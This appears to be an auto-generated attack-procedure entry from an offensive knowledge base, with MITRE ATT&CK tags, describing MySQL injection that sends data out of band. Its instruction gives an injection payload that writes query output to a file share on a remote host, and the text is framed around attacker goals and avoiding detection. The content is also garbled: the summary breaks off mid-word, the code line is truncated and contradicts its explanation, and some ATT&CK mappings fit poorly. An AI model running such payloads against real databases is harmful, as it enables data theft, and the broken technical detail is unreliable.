---
id: 5b7eaecc-91ba-4c5f-9e31-05ab8663c2fc
name: MYSQL Injection Out-of-Band Data Exfiltration
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:35.009612+00:00'
updated_at: '2023-04-10T20:22:48.316407+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Exfiltration|TA0010 - Exfiltration]]'
techniques:
- '[[Exfiltration Over Alternative Protocol|T1048 - Exfiltration Over Alternative
  Protocol]]'
- '[[Web Service|T1102 - Web Service]]'
sub_techniques:
- '[[Dead Drop Resolver|T1102.001 - Dead Drop Resolver]]'
tags:
- '[[MYSQL Injection]]'
- '[[MYSQL Out of band]]'
---

# MYSQL Injection Out-of-Band Data Exfiltration

## Summary

This procedure is a method of exfiltrating data from a MySQL database using out-of-band (OOB) techniques. The attacker can use a MYSQL injection vulnerability to export the version of the MYSQL database to a remote file. The attacker can then use an OOB channel such as DNS or HTTP to exfiltrate thi

## Description

# Description

This procedure is a method of exfiltrating data from a MySQL database using out-of-band (OOB) techniques. The attacker can use a MYSQL injection vulnerability to export the version of the MYSQL database to a remote file. The attacker can then use an OOB channel such as DNS or HTTP to exfiltrate this data to their command and control server. This technique is useful when direct network connections are blocked or when the attacker wants to avoid detection by using a covert channel.

From a technical standpoint, the attacker uses a MYSQL injection vulnerability to execute a command that exports the version of the MYSQL database to a remote file. The attacker then uses DNS or HTTP to exfiltrate this data to their command and control server. The attacker can then use this information to determine which exploits to use against the database. 

The business value of this procedure is that it allows the attacker to exfiltrate sensitive data from a MYSQL database without being detected. This data can then be used for further attacks against the organization.

## Requirements

1. Access to a MYSQL injection vulnerability

1. Ability to export data to a remote file

1. Ability to exfiltrate data over an out-of-band channel

## Defense

1. Ensure that all input to the MYSQL database is properly sanitized to prevent MYSQL injection vulnerabilities

1. Monitor network traffic for suspicious DNS or HTTP requests

1. Use a web application firewall to block MYSQL injection attacks

## Objectives

1. Exfiltrate sensitive data from a MYSQL database

1. Avoid detection by using an out-of-band channel

1. Determine which exploits to use against the database

# Instructions

1. This command exports the MySQL version to a remote file using the 'outfile' and 'dumpfile' commands. The double backslashes in the file path are necessary to escape the backslashes and ensure the correct path is used.

**Code**: [[select @@version into outfile '\\\\192.168.0.100\\]]

> The 'select @@version' command retrieves the version of MySQL being used. The 'into outfile' command exports the result to a file on the server running MySQL. The 'into dumpfile' command exports the result to a file on the file system of the server running MySQL. In this case, both commands are used to export the MySQL version to a file located on a remote server at the file path '\\192.168.0.100\temp\out.txt'.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Exfiltration|TA0010 - Exfiltration]]

### Techniques

- [[Exfiltration Over Alternative Protocol|T1048 - Exfiltration Over Alternative Protocol]]
- [[Web Service|T1102 - Web Service]]

### Sub-Techniques

- [[Dead Drop Resolver|T1102.001 - Dead Drop Resolver]]

## Tags

- [[MYSQL Injection]]
- [[MYSQL Out of band]]
